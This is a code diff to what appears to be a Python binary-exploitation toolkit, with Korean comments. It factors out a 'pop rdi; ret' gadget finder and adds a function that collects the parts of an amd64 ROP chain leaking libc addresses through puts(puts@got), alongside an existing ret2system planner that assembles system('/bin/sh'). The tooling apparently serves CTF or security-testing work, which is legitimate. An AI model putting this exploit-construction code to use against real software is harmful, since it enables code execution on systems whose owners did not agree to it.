@@ -906,18 +906,57 @@ def ret2system_plan(image: ElfImage) -> dict | None:
 
     if (image.bits or 64) != 64:
         return None
-    gadgets = scan_gadgets(image).gadgets
-    pop_rdi = None
-    for gadget in gadgets:
-        body = [t.strip().lower() for t in gadget.instructions]
-        if body and body[0] == "pop rdi" and body[-1].startswith("ret"):
-            if pop_rdi is None or len(body) < len(pop_rdi.instructions):
-                pop_rdi = gadget
+    pop_rdi = _find_pop_rdi(image)
     binsh = find_binsh(image)
     system = _system_address(image)
     if pop_rdi is None or binsh is None or system is None:
         return None
-    return {"pop_rdi": pop_rdi.address, "binsh": binsh, "system": system}
+    return {"pop_rdi": pop_rdi, "binsh": binsh, "system": system}
+
+
+def _find_pop_rdi(image: ElfImage) -> int | None:
+    """``pop rdi ; ret`` 로 시작·끝나는 최단 가젯의 주소(없으면 None)."""
+
+    best = None
+    for gadget in scan_gadgets(image).gadgets:
+        body = [t.strip().lower() for t in gadget.instructions]
+        if body and body[0] == "pop rdi" and body[-1].startswith("ret"):
+            if best is None or len(body) < best[1]:
+                best = (gadget.address, len(body))
+    return None if best is None else best[0]
+
+
+def leak_plan(image: ElfImage) -> dict | None:
+    """amd64 puts 기반 libc 주소 leak 체인 구성요소를 정적으로 수집.
+
+    ``puts(puts@got)`` 로 런타임 libc 주소를 출력한 뒤 ``exit`` 로 깨끗이 종료해
+    stdio 버퍼를 flush 한다(비대화형 파이프에서 출력을 회수하려면 flush 필수).
+    ``{"pop_rdi", "got_target", "puts_plt", "exit_plt"}`` 를 반환하거나, 구성요소가
+    없으면 None. 동적 링크(PLT) 바이너리에서만 의미가 있다.
+    """
+
+    if (image.bits or 64) != 64:
+        return None
+    report = analyze_got_plt(image)
+    plt = {entry.symbol: entry for entry in report.plt_entries}
+    puts = plt.get("puts")
+    exit_entry = plt.get("exit")
+    pop_rdi = _find_pop_rdi(image)
+    if (
+        pop_rdi is None
+        or puts is None
+        or not puts.address
+        or not puts.got_address
+        or exit_entry is None
+        or not exit_entry.address
+    ):
+        return None
+    return {
+        "pop_rdi": pop_rdi,
+        "got_target": puts.got_address,  # puts@got → 런타임 libc puts 주소
+        "puts_plt": puts.address,
+        "exit_plt": exit_entry.address,
+    }
 
 
 def inject_confirmed_offset(
